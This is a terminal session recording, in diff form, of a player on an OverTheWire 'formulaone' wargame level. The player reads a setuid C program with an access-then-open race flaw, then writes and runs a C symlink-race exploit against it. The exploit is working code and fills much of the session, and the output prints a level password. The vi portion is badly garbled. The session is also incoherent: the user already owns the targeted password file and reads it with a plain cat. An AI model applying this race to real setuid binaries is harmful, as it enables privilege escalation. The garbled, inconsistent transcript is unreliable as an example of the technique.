@@ -1,0 +1,155 @@
+bash-5.2$ export PS1='client$ '
+client$ ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 formulaone1@drifter.labs.overthewire.org -p 2232
+             __                            _                        
+            / _| ___  _ __ _ __ ___  _   _| | __ _  ___  _ __   ___ 
+           | |_ / _ \| '__| '_ ` _ \| | | | |/ _` |/ _ \| '_ \ / _ \
+           |  _| (_) | |  | | | | | | |_| | | (_| | (_) | | | |  __/
+           |_|  \___/|_|  |_| |_| |_|\__,_|_|\__,_|\___/|_| |_|\___|
+                                                                    
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+backend: gibson-0
+formulaone1@drifter.labs.overthewire.org's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+
+If you find any problems, please report them to the #wargames channel on
+discord or IRC.
+
+--[ Playing the games ]--
+
+  This machine might hold several wargames.
+  If you are playing "somegame", then:
+
+    * USERNAMES are somegame0, somegame1, ...
+    * Most LEVELS are stored in /somegame/.
+    * PASSWORDS for each level are stored in /etc/somegame_pass/.
+
+  Write-access to homedirectories is disabled. It is advised to create a
+  working directory with a hard-to-guess name in /tmp/.  You can use the
+  command "mktemp -d" in order to generate a random and hard to guess
+  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
+  restricted so that users cannot snoop on eachother. Files and directories
+  with easily guessable or short names will be periodically deleted! The /tmp
+  directory is regularly wiped.
+  Please play nice:
+
+    * don't leave orphan processes running
+    * don't leave exploit-files laying around
+    * don't annoy other players
+    * don't post passwords or spoilers
+    * again, DONT POST SPOILERS!
+      This includes writeups of your solution on your blog or website!
+
+--[ Tips ]--
+
+  This machine has a 64bit processor and many security-features enabled
+  by default, although ASLR has been switched off.  The following
+  compiler flags might be interesting:
+
+    -m32                    compile for 32bit
+    -fno-stack-protector    disable ProPolice
+    -Wl,-z,norelro          disable relro
+
+  In addition, the execstack tool can be used to flag the stack as
+  executable on ELF binaries.
+
+  Finally, network-access is limited for most levels by a local
+  firewall.
+
+--[ Tools ]--
+
+ For your convenience we have installed a few useful tools which you can find
+ in the following locations:
+
+    * gef (https://github.com/hugsy/gef) in /opt/gef/
+    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
+    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
+    * pwntools (https://github.com/Gallopsled/pwntools)
+    * radare2 (http://www.radare.org/)
+
+--[ More information ]--
+
+  For more information regarding individual wargames, visit
+  http://www.overthewire.org/wargames/
+
+  For support, questions or comments, contact us on discord or IRC.
+
+  Enjoy your stay!
+
+formulaone1@formulaone:~$ id
+uid=20001(formulaone1) gid=20001(formulaone1) groups=20001(formulaone1)
+formulaone1@formulaone:~$ cat /formulaone/formulaone1.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+  if (access(argv[1], R_OK) < 0) return 1;
+  printf("Contents:\n");
+  int f = open(argv[1], O_RDONLY);
+  if(f < 0) return 1;
+  char c;
+  while (read(f,&c,1)) write(1,&c,1);
+  return 0;
+}
+formulaone1@formulaone:~$ ls -la /formulaone/formulaone1
+-rwsr-x--- 1 formulaone1 formulaone0 15000 Oct 25 13:38 /formulaone/formulaone1
+formulaone1@formulaone:~$ mkdir -p /run/screen/f1 && cd /run/screen/f1
+formulaone1@formulaone:/run/screen/f1$ echo readable > decoy
+formulaone1@formulaone:/run/screen/f1$ vi /run/screen/f1/racer.c
+[>4;2m="/run/screen/f1/racer.c" 42L, 1322B▽  Pzz\[0%m           [>c/* toggle target between decoy and the password file; fork the setuid
+ *    binary per round; drain the pipe to EOF so partial decoy reads *       (e.g. "r") cannot be mistaken for a password hit. */#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/wait.h>
+int main(void) {
+    char out[512];
+    for (long iter = 0; iter < 200000; iter++) {unlink("target");symlink("decoy", "target");pid_t p = fork();if (p == 0) {symlink("/etc/formulaone_pass/formulaone1", "swap_tmp");rename("swap_tmp", "target");_exit(0);}int fds[2]; pipe(fds);pid_t q = fork();if (q == 0) {dup2(fds[1], 1); close(fds[0]); close(fds[1]);execl("/formulaone/formulaone1", "formulaone1", "target", (char*)0);_exit(127);}close(fds[1]);int n = 0, t;while ((t = read(fds[0], out+n, sizeof(out)-1-n)) > 0) n += t;close(fds[0]);if (n > 0) {out[n] = 0;if (strstr(out, "readable") == NULL && strlen(out) > 10) {printf("HIT iter %ld: %s\n", iter, out);1,1Top^[  ^[  :set noai nocin nosi indentexpr= formatoptions=1,1TopdG  ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   ~                                                                                                   --No lines in buffer--0,0-1Alli -- INSERT --0,1All/1,2/*3 4t5o6g7g8l9e10 1t2a3r4g5e6t7 8b9e20t1w2e3e4n5 6d7e8c9o30y1 2a3n4d5 6t7h8e9 40p1a2s3s4w5o6r7d8 9f50i1l2e3;4 5f6o7r8k9 60t1h2e3 4s5e6t7u8i9d702,1  2*3 4 5 6 7b8i9n10a1r2y3 4p5e6r7 8r9o20u1n2d3;4 5d6r7a8i9n30 1t2h3e4 5p6i7p8e9 40t1o2 3E4O5F6 7s8o9 50p1a2r3t4i5a6l7 8d9e60c1o2y3 4r5e6a7d8s93,1  2*3 4 5 6 7 8 9 10(1e2.3g4.5 6"7r8"9)()20 ()1c2a3n4n5o6t7 8b9e30 1m2i3s4t5a6k7e8n9 40f1o2r3 4a5 6p7a8s9s50w1o2r3d4 5h6i7t8.9 60*1/24,1 #2i3n4c5l6u7d8e910#include <1s2t3d4i5o6.7h8<stdio.h>95,1 #2i3n4c5l6u7d8e910#include <1u2n3i4s5t6d7.8h9<unistd.h>206,1 #in4c5l6u7d8e910#include <1s2t3r4i5n6g7.8h9<string.h>207,1 #2i3n4c5l6u7d8e910#include <1s2y3s4/5w6a7i8t9.20h1<sys/wait.h>28,1 i2n3int45m6a7i8n9(10v1o2i3void4)()5()6{79,1 2345c6h7a8char910o1u2t3[4551627][]8;[]910,12345f6o7for89(10l1o2n3long45i6t7e8r920=1203;45i6t7e8r930<12230405060708;940i1t2e3r4+5+6)()7()8{91,1 23456789u10n1l2i3n4k5(6"7t8a9r20g1e2t3"4)()5;()62,1 23456789s10y1m2l3i4n5k6(7"8d9e20c1o2y3"4,56"7t8a9r30g1e2t3"4)()5;()63,1 23456789p10i1d2_3t45p67=89f20o1for2fork3(4)()5;()64,1 23456789i10if12(3p45=6=7809)()20()1{25,1 2345678910123s4y5m6l7i8n9k20(1"2/3e4t5c6/7f8o9r30m1u2l3a4o5n6e7_8p9a40s1s2/3f4o5r6m7u8l9a50o1n2e314"5,67"8s9w60a1p2_3t4m5p6"7)()8;()96,1 2345678910123r4e5n6a7m8e9(20"1s2w3a4p5_6t7m8p9"30,12"3t4a5r6g7e8t9"40)()1;()27,1 2345678910123_4e5x6i7t8(9020)()1;()28,1 23456789}{}10{}9,1 23456789i10n1int23f4d5s6[728][]9;[]201p2i3p4e5(6f7d8s9)(fds)30;(fds)120,1 23456789p10i1d2_3t45q67=89f20o1for2fork3(4)()5;()61,1 23456789i10if12(3q45=6=7809)()20()1{22,1 2345678910123d4u5p627(8f9d20s1[213][]4,[]5617)()8;()930c1l2o3s4e5(6f7d8s9[4001][]2)(fds[])3;()45c6l7o8s9e50(1f2d3s4[516][]7)(fds[])8;()93,1 2345678910123e4x5e6c7l8(9"20/1f2o3r4m5u6l7a8o9n30e1/2f3o4r5m6u7l8a9o40n1e213"4,56"7f8o9r50m1u2l3a4o5n6e718"9,60 "2t3a4r5g6e7t8"9,701(2c3h4a5char6*7)()80()9)()80;()14,1 2345678910123_4e5x6i7t8(91202172)()3;()45,1 23456789}{}10{}6,1 23456789c10l1o2s3e4(5f6d7s8[9120][]1)(fds[])2;()37,1 23456789i10n1int23n45=6708,920t1;28,1 23456789w10h1i2l3while45(6(7t89=201r2e3a4d(6f7d8s9[3001][]2,[]34o5u6t7+8n9,401s2i3z4e5o6sizeof7(8o9u50t1)(out)2-(out)314-5n6)()7)(())8()9>60102)4n56+7=89t70;1
+~                                                                                                   29,1Bot23456789c10l1o2s3e4(5f6d7s8[9020])()2;()3
+~                                                                                                   30,1Bot23456789i10if12(3n45>6708)()9()20{1
+~                                                                                                   31,1Bot2345678910123o4u5t6[7n8][n]9[n]20=1203;4
+~                                                                                                   32,1Bot24678910123i4if56(7s8t9r20s1t2r3(4o5u6t7,89"30r1e2a3d4a5b6l7e8"9)()40()1=2=34N5U6L7NULL89&50&12s3t4r5l6e7n8(9o60u1t2)(out)3(out)4>561708)()9
+{~                                                                                                   33,1Bot()
+23456789101234567p8r9i20n1t2f3(4"5H6I7T8 9i30t1e2r3 4%5l6%ld7:8 9%40%s1\2n3"4,6it8e9r50,12o3u4t5)()6;()7
+~                                                                                                   34,1Bot23456789101234567f8f9l20u1s2h3(4s5t6d7o8u9stdout30)()1;()2
+~                                                                                                   35,1Bot2345678910123}{}4
+~                                                                                                   36,1Bot{}
+23456789}{}10
+~                                                                                                   37,1Bot{}
+23456789w10a1i2t3p4i5d6(7p8,920N1U2L3NULL4,5607)()8;()9
+~                                                                                                   38,1Bot23456789w10a1i2t3p4i5d6(7q8,920N1U2L3NULL4,5607)()8;()9
+~                                                                                                   39,1Bot45}640,12345r6e7t8u9r10return1203;1,1 }22,1^[  42,0-1Bot:wq[>4;m"racer.c" 42L, 1322B written
+>[>4;mformulaone1@formulaone:/run/screen/f1$ mktemp -d; cd /run/screen/f1
+/tmp/tmp.h1bhhN389P
+formulaone1@formulaone:/run/screen/f1$ gcc /run/screen/f1/racer.c -o /run/screen/f1/racer
+formulaone1@formulaone:/run/screen/f1$ timeout 240 /run/screen/f1/racer | head -1
+HIT iter 0: lyRzImzq8DFfsDJEhGRIqc71CVqipvxo
+formulaone1@formulaone:/run/screen/f1$ cat /etc/formulaone_pass/formulaone1
+lyRzImzq8DFfsDJEhGRIqc71CVqipvxo
+formulaone1@formulaone:/run/screen/f1$ exit
+logout
+Connection to drifter.labs.overthewire.org closed.
+client$ exit
+exit
